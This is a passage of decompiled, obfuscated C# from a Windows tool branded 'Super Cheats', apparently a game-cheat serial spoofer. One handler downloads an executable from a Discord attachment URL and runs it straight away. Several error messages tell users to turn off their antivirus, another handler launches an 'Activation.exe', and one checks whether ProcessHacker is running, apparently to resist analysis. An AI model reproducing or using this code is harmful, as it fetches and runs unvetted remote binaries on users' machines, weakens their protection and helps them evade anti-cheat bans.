				Process.Start("C:\\Windows\\Activation.exe");
			}
			catch (Exception ex)
			{
				MessageBox.Show("Could not fix [WIN-ACTIVATE] the main error would be that we cannot download the fixer, then antivirus off and try again!", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00007F08 File Offset: 0x00006108
		public void __VMFUNCTION__43D56(object A_1, EventArgs A_2)
		{
			try
			{
				string text = Path.GetTempPath() + "\\BSOD.bat";
				TextWriter textWriter = new StreamWriter(text);
				textWriter.Write("@echo off");
				textWriter.Write("\necho WAIT FOR THIS TO FINISH");
				textWriter.Write("\necho WAIT FOR THIS TO FINISH");
				textWriter.Write("\necho WAIT FOR THIS TO FINISH");
				textWriter.Write("\nDISM /Online /Cleanup-Image /RestoreHealth");
				textWriter.Write("\nsfc /scannow");
				textWriter.Write("\npause >nul");
				textWriter.Close();
				Process.Start(text);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Could not fix BS, turn antivirus off?", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00007FC0 File Offset: 0x000061C0
		public void __VMFUNCTION__98FF3(object A_1, EventArgs A_2)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00007FE8 File Offset: 0x000061E8
		public void __VMFUNCTION__A142A(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x06000092 RID: 146 RVA: 0x00007FFC File Offset: 0x000061FC
		public void __VMFUNCTION__35494(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00008010 File Offset: 0x00006210
		public void __VMFUNCTION__97E54(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x06000094 RID: 148 RVA: 0x00008024 File Offset: 0x00006224
		public void __VMFUNCTION__1158E(object A_1, EventArgs A_2)
		{
			try
			{
				string path = "C:\\ProgramData\\Temp\\ppsad\\00-00";
				if ((((Directory.Exists(path) ? 1U : 0U) == (uint)0) ? 1U : 0U) != (uint)0)
				{
					Directory.CreateDirectory(path);
				}
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/905114934952755300/ss.exe", "C:\\ProgramData\\Temp\\ss.exe");
				Process.Start("C:\\ProgramData\\Temp\\ss.exe");
				MessageBox.Show("Spoofed serials, you can check in the serial checkers!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Could not spoof [SERIAL-NULL (TEMP)] turn your antivirus off? Install python?", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000095 RID: 149 RVA: 0x000080C8 File Offset: 0x000062C8
		public void __VMFUNCTION__33D23(object A_1, EventArgs A_2)
		{
			try
			{
				string path = "C:\\Windows\\Temp\\Cleaners";
				if ((((Directory.Exists(path) ? 1U : 0U) == (uint)0) ? 1U : 0U) != (uint)0)
				{
					Directory.CreateDirectory(path);
				}
				string path2 = "C:\\Windows\\Clean";
				if ((((Directory.Exists(path2) ? 1U : 0U) == (uint)0) ? 1U : 0U) != (uint)0)
				{
					Directory.CreateDirectory(path2);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Could not complete function [DIR-CIR], Your windows is not compatiable!", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00008164 File Offset: 0x00006364
		public void __VMFUNCTION__9BADF(object A_1, PaintEventArgs A_2)
		{
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00008178 File Offset: 0x00006378
		public void __VMFUNCTION__1EE0F(object A_1, PaintEventArgs A_2)
		{
		}

		// Token: 0x06000098 RID: 152 RVA: 0x0000818C File Offset: 0x0000638C
		public void __VMFUNCTION__6C342(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x06000099 RID: 153 RVA: 0x000081A0 File Offset: 0x000063A0
		public void __VMFUNCTION__36FA1(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x0600009A RID: 154 RVA: 0x000081B4 File Offset: 0x000063B4
		public void __VMFUNCTION__73566(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x0600009B RID: 155 RVA: 0x000081C8 File Offset: 0x000063C8
		public void __VMFUNCTION__45F3F(object A_1, EventArgs A_2)
		{
			Process.Start("https://superscommunityserver.tebex.io/package/4996675");
		}

		// Token: 0x0600009C RID: 156 RVA: 0x000081E8 File Offset: 0x000063E8
		public void __VMFUNCTION__95692(object A_1, EventArgs A_2)
		{
			Process.Start("https://superscommunityserver.tebex.io/package/4996678");
		}

		// Token: 0x0600009D RID: 157 RVA: 0x00008208 File Offset: 0x00006408
		public void __VMFUNCTION__41721(object A_1, EventArgs A_2)
		{
			Process.Start("https://superscommunityserver.tebex.io/package/4996679");
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00008228 File Offset: 0x00006428
		public void __VMFUNCTION__69A15(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x0600009F RID: 159 RVA: 0x0000823C File Offset: 0x0000643C
		public void __VMFUNCTION__92CC7(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x00008250 File Offset: 0x00006450
		public void __VMFUNCTION__3CF3F(object A_1, EventArgs A_2)
		{
			try
			{
				Process.Start("C:\\Windows\\System32\\SystemPropertiesComputerName.exe");
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x00008290 File Offset: 0x00006490
		public void __VMFUNCTION__A24BC(object A_1, PaintEventArgs A_2)
		{
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x000082A4 File Offset: 0x000064A4
		public void __VMFUNCTION__4800F(object A_1, EventArgs A_2)
		{
			base.Hide();
			new extendsubscription().ShowDialog();
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x000082CC File Offset: 0x000064CC
		public void __VMFUNCTION__93323(object A_1, EventArgs A_2)
		{
			base.Hide();
			new changepassword().ShowDialog();
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x000082F4 File Offset: 0x000064F4
		public void __VMFUNCTION__43E25(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x00008308 File Offset: 0x00006508
		public void __VMFUNCTION__116FE(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x0000831C File Offset: 0x0000651C
		public void __VMFUNCTION__94EFE(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00008330 File Offset: 0x00006530
		public void __VMFUNCTION__6A84B(object A_1, EventArgs A_2)
		{
			Process.Start("https://superspoofer.xyz/policy-use");
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x00008350 File Offset: 0x00006550
		public void __VMFUNCTION__80A45(object A_1, EventArgs A_2)
		{
			Application.Exit();
		}

		// Token: 0x060000A9 RID: 169 RVA: 0x0000836C File Offset: 0x0000656C
		public void __VMFUNCTION__A1406(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x060000AA RID: 170 RVA: 0x00008380 File Offset: 0x00006580
		public void __VMFUNCTION__6629A(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x060000AB RID: 171 RVA: 0x00008394 File Offset: 0x00006594
		public void __VMFUNCTION__73512(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x060000AC RID: 172 RVA: 0x000083A8 File Offset: 0x000065A8
		public void __VMFUNCTION__A12D9(object A_1, EventArgs A_2)
		{
			if (((Process.GetProcessesByName("ProcessHacker").Length == (int)((uint)0)) ? 1U : 0U) != (uint)0)
			{
				<Module>.__VMFUNCTION__A0E29(this);
			}
			else
			{
				<Module>.__VMFUNCTION__516F1(this);
			}
		}

		// Token: 0x060000AD RID: 173 RVA: 0x000083EC File Offset: 0x000065EC
		public void __VMFUNCTION__EB73(object A_1, EventArgs A_2)
		{
		}

		// Token: 0x060000AE RID: 174 RVA: 0x00008400 File Offset: 0x00006600
		public void __VMFUNCTION__8436C(object A_1, EventArgs A_2)
		{
			base.Opacity = 50.0;
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00008424 File Offset: 0x00006624
		public void __VMFUNCTION__42FE0(object A_1, EventArgs A_2)
		{
			base.Opacity = 30.0;
		}

		// Token: 0x04000020 RID: 32
		private int r = 255;

		// Token: 0x04000021 RID: 33
		private int g = 0;

		// Token: 0x04000022 RID: 34
		private int b = 0;

		// Token: 0x04000024 RID: 36
		private SiticonePanel siticonePanel3;

		// Token: 0x04000025 RID: 37
		private SiticoneDragControl siticoneDragControl1;

		// Token: 0x04000026 RID: 38
		private Timer timer1;

		// Token: 0x04000027 RID: 39
		public ProgressBar blue;

		// Token: 0x04000028 RID: 40
		public ProgressBar green;

		// Token: 0x04000029 RID: 41
		public ProgressBar red;

		// Token: 0x0400002A RID: 42
		public Timer timer2;

		// Token: 0x0400002B RID: 43
		private Timer timer3;

		// Token: 0x0400002C RID: 44
		private Timer timer4;

		// Token: 0x0400002D RID: 45
		private SiticonePanel siticonePanel1;

		// Token: 0x0400002E RID: 46
		private SiticoneButton dashboard;

		// Token: 0x0400002F RID: 47
		private SiticoneButton userin;

		// Token: 0x04000030 RID: 48
		private SiticoneButton webtool;

		// Token: 0x04000031 RID: 49
		private SiticoneButton siticoneGradientButton4;

		// Token: 0x04000032 RID: 50
		private SiticoneButton siticoneGradientButton3;

		// Token: 0x04000033 RID: 51
		private SiticoneButton spooferfixes;

		// Token: 0x04000034 RID: 52
		private SiticoneButton systemspoof;

		// Token: 0x04000035 RID: 53
		private SiticoneButton gamespoof;

		// Token: 0x04000036 RID: 54
		private SiticoneControlBox siticoneControlBox1;

		// Token: 0x04000037 RID: 55
		private SiticoneControlBox siticoneControlBox2;
	}
}
